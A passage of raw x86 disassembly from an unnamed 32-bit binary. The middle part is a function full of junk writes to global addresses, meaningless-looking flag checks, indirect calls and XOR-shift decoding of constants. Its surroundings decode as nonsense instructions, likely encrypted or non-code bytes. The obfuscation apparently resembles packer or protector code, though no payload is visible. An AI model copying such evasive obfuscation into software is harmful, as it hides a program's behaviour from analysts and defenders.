  415916:	add    esi,DWORD PTR [ebp+0x19e522d6]
  41591c:	out    dx,eax
  41591d:	cmc    
  41591e:	push   edx
  41591f:	sbb    edi,ecx
  415921:	mov    eax,0xaacd4e44
  415926:	pusha  
  415927:	sub    eax,0x1993c2aa
  41592c:	pop    ebx
  41592d:	push   es
  41592e:	xchg   ecx,eax
  41592f:	dec    ecx
  415930:	sbb    al,0x72
  415932:	stc    
  415933:	jmp    0x4158ec
  415935:	pop    esi
  415936:	sahf   
  415937:	(bad)  
  415938:	stc    
  415939:	xchg   edx,eax
  41593a:	es icebp 
  41593c:	or     eax,0xde2fa221
  415941:	dec    ecx
  415942:	int3   
  415943:	mov    cl,0x6
  415945:	std    
  415946:	dec    esp
  415947:	jecxz  0x415910
  415949:	sub    edx,DWORD PTR [ebx+0x71]
  41594c:	jae    0x4158ed
  41594e:	sub    bh,0xcd
  415951:	cmp    al,BYTE PTR [edx-0x49]
  415954:	push   esp
  415955:	xor    esp,DWORD PTR [ebx-0x47]
  415958:	mov    ebx,0xfd87f4c5
  41595d:	push   0xffffffc6
  41595f:	mov    al,0x85
  415961:	or     al,0x53
  415963:	mov    cl,0x49
  415965:	xor    eax,0x37f28909
  41596a:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41596c:	add    eax,0xefb42026
  415971:	jb     0x4159b1
  415973:	leave  
  415974:	and    BYTE PTR [ecx],dh
  415976:	in     eax,dx
  415977:	ja     0x415905
  415979:	int    0xef
  41597b:	fucomi st,st(3)
  41597d:	xchg   ebx,ebp
  41597f:	das    
  415980:	mov    esi,0x403d7e8f
  415985:	int3   
  415986:	rcl    DWORD PTR ds:0x35ee371c,cl
  41598c:	test   BYTE PTR [edi],ah
  41598e:	je     0x415971
  415990:	pop    eax
  415991:	adc    BYTE PTR [ecx-0x7aec05f6],0x62
  415998:	pop    es
  415999:	pop    ebp
  41599a:	stos   BYTE PTR es:[edi],al
  41599b:	and    al,BYTE PTR [ebp+0x445a60f4]
  4159a1:	adc    BYTE PTR [ebp-0x712a09b9],0xb9
  4159a8:	shr    edx,cl
  4159aa:	sub    DWORD PTR [edx+edi*4+0x7e1eb0b2],esp
  4159b1:	add    DWORD PTR [edi],esi
  4159b3:	arpl   WORD PTR [esi+0x52abc7b9],bp
  4159b9:	scas   al,BYTE PTR es:[edi]
  4159ba:	pushf  
  4159bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159bc:	jecxz  0x41599d
  4159be:	aaa    
  4159bf:	dec    ebx
  4159c0:	mov    eax,DWORD PTR [ebp-0x20]
  4159c3:	xor    edx,eax
  4159c5:	mov    eax,DWORD PTR [ebp-0x24]
  4159c8:	and    edx,eax
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42824b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x428387,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42821b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x42817b,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x4282df
  415a48:	cmp    DWORD PTR ds:0x42821b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428ed4
  415a74:	mov    edi,DWORD PTR ds:0x4281af
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x4281cf
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x428167
  415a8f:	and    DWORD PTR ds:0x428393,edx
  415a95:	xor    DWORD PTR ds:0x428233,0x17b
  415a9f:	sbb    DWORD PTR ds:0x4282e7,ecx
  415aa5:	adc    DWORD PTR ds:0x42815b,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x428163
  415ac7:	xor    DWORD PTR ds:0x42828f,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x4281df
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x42829b
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x428373,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42823f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x4281bf
  415b25:	mov    edx,DWORD PTR ds:0x42820f
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x42837f,0x0
  415b3a:	not    DWORD PTR ds:0x428303
  415b40:	mov    DWORD PTR ds:0x42825b,0x4d0
  415b4a:	mov    DWORD PTR ds:0x428153,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x428363,0x25ca
  415b63:	cmp    DWORD PTR ds:0x42837f,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42814b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428e6c
  415b83:	add    DWORD PTR ds:0x42835b,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x42830f,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x4282db
  415ba0:	adc    DWORD PTR ds:0x428317,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x42816f,0x0
  415bb5:	mov    DWORD PTR ds:0x428167,0x74bf
  415bbf:	mov    DWORD PTR ds:0x4282e7,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x42816f,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428247
  415bef:	call   DWORD PTR ds:0x428e70
  415bf5:	sub    edi,DWORD PTR ds:0x428393
  415bfb:	sbb    DWORD PTR ds:0x428317,ecx
  415c01:	and    edx,DWORD PTR ds:0x428187
  415c07:	mov    edi,DWORD PTR ds:0x42822f
  415c0d:	and    DWORD PTR ds:0x42816b,edi
  415c13:	or     DWORD PTR ds:0x428163,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x428193
  415c23:	mov    edx,DWORD PTR ds:0x42831b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x42835f,0x0
  415c38:	mov    DWORD PTR ds:0x42838b,ebx
  415c3e:	mov    DWORD PTR ds:0x42815f,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x42817b,edx
  415c4f:	cmp    DWORD PTR ds:0x42835f,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x4282fb
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428dc0
  415c88:	mov    edi,DWORD PTR ds:0x4281b7
  415c8e:	mov    edx,DWORD PTR ds:0x42833f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428317,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42822f
  415cab:	mov    eax,ds:0x4223c8
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x4225e8
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x42837b,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x42826b
  415cd7:	mov    ebx,DWORD PTR ds:0x428393
  415cdd:	mov    DWORD PTR ds:0x428233,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x42836b,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x42837b,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428dc4
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x428257
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x42826f,0x428253
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x4282ff,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428317,0x0
  415d58:	mov    DWORD PTR ds:0x428273,0x5216
  415d62:	not    DWORD PTR ds:0x42824b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x42826b,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x42828b,ebx
  415d82:	cmp    DWORD PTR ds:0x428317,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x4280ab
  415d94:	push   0x428059
  415d99:	call   DWORD PTR ds:0x428dc8
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x42826f
  415dab:	sbb    DWORD PTR ds:0x428393,edx
  415db1:	or     DWORD PTR ds:0x428373,ebx
  415db7:	sbb    DWORD PTR ds:0x428293,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x42830f,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42814f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428147,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x42818b,0x428153
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x42818b,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x42835f,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x428267,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x428293,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42823f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x42826f,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x4282f7,0x42817f
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x428163,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x42830f,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x42817f,0x1988
  415e9d:	mov    DWORD PTR ds:0x428287,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x428163,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428dcc
  415ec4:	or     DWORD PTR ds:0x428223,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x42835b,0x174
  415ede:	mov    DWORD PTR ds:0x42837f,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x42837b
  415eee:	add    edx,DWORD PTR ds:0x42815f
  415ef4:	mov    DWORD PTR ds:0x42837b,edx
  415efa:	or     DWORD PTR ds:0x428367,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428317
  415f06:	or     DWORD PTR ds:0x428277,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x428287,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x42830f,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428143,0x0
  415f3b:	mov    DWORD PTR ds:0x428167,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x428367
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x428307,ebx
  415f59:	cmp    DWORD PTR ds:0x428143,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428ed8
  415f91:	xor    DWORD PTR ds:0x428397,edx
  415f97:	sbb    edi,DWORD PTR ds:0x428273
  415f9d:	sub    DWORD PTR ds:0x42822f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x42836b
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428313
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x428363,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x42817b,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x42817b
  415fdc:	add    DWORD PTR ds:0x428263,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42822f,0x0
  415fec:	mov    DWORD PTR ds:0x428383,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x428397,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x428363,0x1cd3
  416015:	mov    DWORD PTR ds:0x42815f,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42822f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428edc
  416037:	add    DWORD PTR ds:0x428163,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x428307,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42823f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428237
  41605c:	adc    DWORD PTR ds:0x42825b,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x42838b,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x4282f7,0x42826f
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x42817f,0x0
  416089:	mov    DWORD PTR ds:0x428317,0x1e83
  416093:	mov    DWORD PTR ds:0x428373,edx
  416099:	movzx  ecx,WORD PTR ds:0x42824b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x428183
  4160ad:	cmp    DWORD PTR ds:0x42817f,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428dd0
  4160c6:	adc    DWORD PTR ds:0x42830b,edi
  4160cc:	or     DWORD PTR ds:0x42824b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42821f
  4160dc:	sub    DWORD PTR ds:0x42817b,ecx
  4160e2:	add    DWORD PTR ds:0x42826f,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422548
  4160f5:	and    ecx,DWORD PTR ds:0x42825f
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x42836b,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x428383,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x42817b,0x0
  416120:	mov    DWORD PTR ds:0x428363,0x7b16
  41612a:	mov    DWORD PTR ds:0x42817f,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x42825b,0x5f2a
  416143:	cmp    DWORD PTR ds:0x42817b,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428ee0
  416159:	xor    DWORD PTR ds:0x428157,0x42814b
  416163:	sub    DWORD PTR ds:0x428143,0x42816f
  41616d:	sbb    DWORD PTR ds:0x42827f,0x428277
  416177:	and    DWORD PTR ds:0x42826f,0x56d1
  416181:	xor    DWORD PTR ds:0x42825b,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42824f,0x42818b
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x4281ff
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x428183,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x42817b,0x428257
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x42827b,0x42823b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x428307,0x42821b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x428273,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	jb     0x4162c4
  416311:	push   es
  416312:	push   0xfffffff4
  416314:	add    BYTE PTR [esi],dl
  416316:	sbb    BYTE PTR [ebx+0x56181814],bl
  41631c:	ja     0x4162f3
  41631e:	sub    BYTE PTR [ebx-0x63],dh
  416321:	pop    ss
  416322:	scas   eax,DWORD PTR es:[edi]
  416323:	ins    BYTE PTR es:[edi],dx
  416324:	or     al,0x4b
  416326:	inc    edi
  416327:	lods   al,BYTE PTR ds:[esi]
  416328:	loop   0x416325
  41632a:	cmp    DWORD PTR [esi+0x5d],edx
  41632d:	out    0xf5,eax
  41632f:	sub    ah,BYTE PTR ds:0x625ed302
  416335:	xor    al,0xb
  416337:	xor    BYTE PTR [edi-0x41],0x92
  41633b:	dec    edi
  41633c:	add    al,0xe9
  41633e:	pop    es
  41633f:	sub    bh,BYTE PTR [edx]
  416341:	sahf   
  416342:	popa   
  416343:	push   edi
  416344:	adc    DWORD PTR [ecx+0x1a],ecx
  416347:	test   BYTE PTR [eax],dh
  416349:	sti    
  41634a:	xchg   edi,eax
  41634b:	push   esp
  41634c:	sahf   
  41634d:	add    ch,dl
  41634f:	xchg   esi,eax
  416350:	int    0x37
  416352:	lea    edi,[esi+0x16986b92]
  416358:	sbb    al,0x68
  41635a:	inc    eax
  41635b:	push   esi
  41635c:	xchg   DWORD PTR [eax],eax
  41635e:	xor    DWORD PTR [edx],ebp
  416360:	cmp    eax,0x1925c1cf
  416365:	dec    ebp
  416366:	arpl   bp,di
  416368:	dec    eax
  416369:	jecxz  0x4163aa
  41636b:	inc    edx
  41636c:	stos   DWORD PTR es:[edi],eax
  41636d:	jg     0x4162f4
  41636f:	aam    0x7b
  416371:	lea    esi,[esi-0x31]
  416374:	ja     0x416325
  416376:	pop    ebx
  416377:	call   0xf9ea0dd
  41637c:	sub    eax,DWORD PTR [ebp-0x8c92d58]
  416382:	pop    ss
  416383:	inc    edx
  416384:	dec    ebx
  416385:	out    dx,al
  416386:	xor    ch,ch
  416388:	ret    
  416389:	loopne 0x4163cd
  41638b:	dec    esi
  41638c:	cli    
  41638d:	rcl    di,1
  416390:	repnz pushf 
  416392:	in     al,0x2a
  416394:	out    dx,al
  416395:	xchg   ebp,eax
  416396:	sub    ch,al
  416398:	std    
  416399:	mov    eax,0x748c31ba
  41639e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41639f:	add    eax,0xafd12e8d
  4163a4:	pop    esp
  4163a5:	jae    0x416336
  4163a7:	push   edx
  4163a8:	push   ds
  4163a9:	adc    eax,0x7df3d5e8
  4163ae:	cli    
  4163af:	push   edx
  4163b0:	lahf   
  4163b1:	mov    ds:0xb5f9180b,al
  4163b6:	adc    al,0x73
  4163b8:	adc    eax,0x96b5bd8a
  4163bd:	sbb    eax,ebp
  4163bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163c0:	mov    dh,0x38
  4163c2:	loop   0x416426
  4163c4:	add    al,0xc
  4163c6:	fwait
  4163c7:	xor    cl,BYTE PTR [esi+0x36a42c97]
  4163cd:	fs add ah,dl
  4163d0:	je     0x41637d
  4163d2:	add    esi,DWORD PTR [ebx]
  4163d4:	ja     0x41642c
  4163d6:	leave  
  4163d7:	nop
  4163d8:	sar    BYTE PTR [edx+0x4],0xf2
  4163dc:	sahf   
  4163dd:	mov    dl,0x1f
  4163df:	sbb    esi,edi
  4163e1:	cmc    
  4163e2:	repz sbb al,0xf0
  4163e5:	clc    
  4163e6:	les    ecx,FWORD PTR [ebx-0x1716bd98]
  4163ec:	cmp    dh,BYTE PTR [esi]
  4163ee:	mov    ch,0x95
  4163f0:	shl    DWORD PTR [edx-0x40],1
  4163f3:	xchg   ebx,eax
  4163f4:	js     0x4163a8
  4163f6:	mov    edi,DWORD PTR [edx+0x1fb14ae8]
  4163fc:	push   ss
  4163fd:	in     al,dx
  4163fe:	ror    ch,1
  416400:	fs push ebp
  416402:	in     al,0x49
  416404:	cmp    BYTE PTR [ebx],ah
  416406:	add    eax,0xf892332b
  41640b:	js     0x416461
  41640d:	cs xchg ecx,eax
  41640f:	xchg   esp,eax
  416410:	repz mov dl,0x94
